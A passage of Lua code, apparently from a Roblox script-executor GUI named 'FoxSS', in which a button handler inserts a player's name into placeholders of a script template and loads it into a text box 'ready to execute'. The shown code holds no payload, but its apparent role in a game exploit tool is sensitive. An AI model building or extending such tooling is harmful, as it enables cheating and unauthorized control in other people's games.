    end)
    
    btn.MouseButton1Click:Connect(function()
        local final = code:gsub('""', '"'..playerName..'"')
                          :gsub("''", "'"..playerName.."'")
                          :gsub('"name"', '"'..playerName..'"')
                          :gsub('"username"', '"'..playerName..'"')
                          :gsub('"plr"', '"'..playerName..'"')
                          :gsub('"YourNameHere"', '"'..playerName..'"')
        FoxSS["TextBox_1b"].Text = final
        notify("Script cargado", "Listo para ejecutar")
    end)
end

